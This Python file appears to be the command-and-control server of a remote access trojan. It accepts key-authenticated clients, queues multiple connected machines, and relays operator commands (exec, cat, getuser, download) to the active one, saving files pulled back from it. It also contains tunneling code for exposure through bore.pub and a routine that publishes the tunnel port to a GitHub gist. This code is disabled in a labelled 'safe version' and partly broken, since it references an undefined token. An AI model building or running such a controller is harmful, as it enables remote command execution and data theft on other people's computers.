import socket
import threading
import subprocess
import re
import json
import time
import urllib.request
from dotenv import load_dotenv
import os

load_dotenv()
KEY = os.getenv("KEY", "Nyx")
HOST = "127.0.0.1"
PORT = 5050

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(10)

receiving_file = False
current_filename = ""
remaining_bytes = 0
file_buffer = b""
clients = {}
client_queue = []
active_client = None
bore_process = None
print_lock = threading.Lock()


def _strip_ansi(line):
    return re.sub(r"\x1b\[[0-9;]*m", "", line)


def _read_bore_stream(stream, port_found, timer):
    try:
        for line in iter(stream.readline, ""):
            if not line or port_found[0] is not None:
                break
            clean = _strip_ansi(line)
            m = re.search(r"bore\.pub[:\s]+(\d+)|remote_port[=:](\d+)|listening\s+at\s+.*?(\d{4,5})\b", clean)
            if m:
                port_found[0] = m.group(1) or m.group(2) or m.group(3)
                timer.cancel()
                p = port_found[0]
                with print_lock:
                    print(f"[tunnel] bore.pub:{p}")
                url = _update_gist_port(p)
                try:
                    d = os.path.dirname(os.path.abspath(__file__))
                    with open(os.path.join(d, "CONNECT.txt"), "w") as f:
                        if url:
                            f.write(f'PORT_URL = {url!r}\n')
                        f.write(f"TUNNEL_PORT = {p}\n")
                        f.write(f'KEY = {KEY!r}\n')
                except Exception:
                    pass
                break
    except Exception:
        pass


def _read_bore_port():
    port_found = [None]
    timer = threading.Timer(20.0, lambda: None)
    timer.daemon = True
    timer.start()
    t1 = threading.Thread(target=_read_bore_stream, args=(bore_process.stderr, port_found, timer), daemon=True)
    t2 = threading.Thread(target=_read_bore_stream, args=(bore_process.stdout, port_found, timer), daemon=True)
    t1.start()
    t2.start()


def start_bore():
    global bore_process
    with print_lock:
        print("[tunnel] disabled (safe version)")


def _update_gist_port(port):
    return None 
    gist_id = os.getenv("GIST_ID")
    user = os.getenv("GITHUB_USER")
    if not token or not gist_id:
        return None
    try:
        req = urllib.request.Request(
            f"https://api.github.com/gists/{gist_id}",
            data=json.dumps({"files": {"port.txt": {"content": str(port)}}}).encode(),
            method="PATCH",
            headers={"Authorization": f"token {token}", "Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read().decode())
            username = data.get("owner", {}).get("login") or user
    except Exception:
        username = user
    if username:
        return f"https://gist.githubusercontent.com/{username}/{gist_id}/raw/port.txt"
    return None


def accept_connections():
    global active_client
    while True:
        try:
            sock, addr = server.accept()
            buf = b""
            while b"\n" not in buf and len(buf) < 512:
                chunk = sock.recv(256)
                if not chunk:
                    sock.close()
                    break
                buf += chunk
            if not buf or b"\n" not in buf:
                try:
                    sock.close()
                except Exception:
                    pass
                continue
            line, rest = buf.split(b"\n", 1)
            auth_line = line.decode("utf-8", errors="ignore").strip()
            if not auth_line.startswith("AUTH ") or auth_line[5:].strip() != KEY:
                with print_lock:
                    print(f"[reject] {addr[0]}")
                try:
                    sock.close()
                except Exception:
                    pass
                continue
            if client_queue:
                with print_lock:
                    print(f"[{addr[0]}] is now waiting in line")
            clients[sock] = {"addr": addr}
            client_queue.append(sock)
            if len(client_queue) == 1:
                active_client = sock
                with print_lock:
                    print(f"[active] {addr[0]}")
            threading.Thread(target=handle_client, args=(sock, rest if rest else None), daemon=True).start()
        except OSError:
            if server.fileno() == -1:
                break
            raise
        except Exception:
            pass


def handle_client(sock, first_data=None):
    global active_client, receiving_file, current_filename, file_buffer, remaining_bytes
    try:
        if first_data:
            process_incoming(sock, first_data)
        while True:
            data = sock.recv(4096)
            if not data:
                break
            process_incoming(sock, data)
    except Exception:
        pass
    addr = clients.get(sock, {}).get("addr", ("?", "?"))
    if sock in client_queue:
        client_queue.remove(sock)
    if sock in clients:
        del clients[sock]
    try:
        sock.close()
    except Exception:
        pass
    with print_lock:
        print(f"[disconnect] {addr[0]}")
    if active_client == sock:
        active_client = client_queue[0] if client_queue else None
        with print_lock:
            print(f"[active] {active_client and clients.get(active_client, {}).get('addr', ('?', '?'))[0] or 'none'}")


def process_incoming(sock, data):
    global receiving_file, current_filename, file_buffer, remaining_bytes
    if sock != active_client:
        addr = clients.get(sock, {}).get("addr", ("?", "?"))
        with print_lock:
            print(f"[queue] {addr[0]}: {data[:50]!r}")
        return
    if receiving_file:
        if len(data) > remaining_bytes:
            file_buffer += data[:remaining_bytes]
            remaining_bytes = 0
        else:
            file_buffer += data
            remaining_bytes -= len(data)
        if remaining_bytes <= 0:
            os.makedirs("downloads", exist_ok=True)
            path = os.path.join("downloads", current_filename)
            with open(path, "wb") as f:
                f.write(file_buffer)
            with print_lock:
                print(f"[saved] {path}")
            receiving_file = False
            current_filename = ""
            file_buffer = b""
        return
    msg = data.decode("utf-8", errors="ignore")
    if msg.startswith("FILE "):
        parts = msg.strip().split(" ", 2)
        if len(parts) == 3 and parts[2].isdigit():
            current_filename = parts[1]
            remaining_bytes = int(parts[2])
            receiving_file = True
            file_buffer = b""
        return
    if msg.startswith("DIR "):
        with print_lock:
            print(msg[4:].strip() or "(empty)")
        return
    with print_lock:
        print(msg)


def next_client():
    global active_client
    if not client_queue:
        active_client = None
        with print_lock:
            print("[active] none")
        return
    client_queue.append(client_queue.pop(0))
    active_client = client_queue[0]
    addr = clients[active_client]["addr"]
    with print_lock:
        print(f"[active] {addr[0]}")


def prev_client():
    global active_client
    if not client_queue:
        active_client = None
        with print_lock:
            print("[active] none")
        return
    client_queue.insert(0, client_queue.pop())
    active_client = client_queue[0]
    addr = clients[active_client]["addr"]
    with print_lock:
        print(f"[active] {addr[0]}")


def main():
    threading.Thread(target=accept_connections, daemon=True).start()
    threading.Thread(target=start_bore, daemon=True).start()
    time.sleep(0.5)
    print("Server ready. Commands: help | next | prev | clear | shutdown | <send to client>")
    while True:
        try:
            line = input("> ").strip()
        except EOFError:
            break
        if not line:
            continue
        low = line.lower()
        if low == "help":
            print("help     this message")
            print("next     switch to next ip in line")
            print("prev     switch to previous ip in line")
            print("clear    clear screen")
            print("shutdown stop server")
            print("ls, cd, download, exec, platform, getuser, test, cat ...  send to active client")
            continue
        if low == "clear":
            os.system("cls" if os.name == "nt" else "clear")
            continue
        if low == "shutdown":
            for s in list(clients.keys()):
                try:
                    s.close()
                except Exception:
                    pass
            try:
                server.close()
            except Exception:
                pass
            if bore_process and bore_process.poll() is None:
                try:
                    bore_process.terminate()
                except Exception:
                    pass
            break
        if low == "next":
            next_client()
            continue
        if low == "prev":
            prev_client()
            continue
        if not active_client:
            print("no active client")
            continue
        try:
            active_client.send(line.encode("utf-8"))
        except Exception:
            print("send failed")


if __name__ == "__main__":
    main()
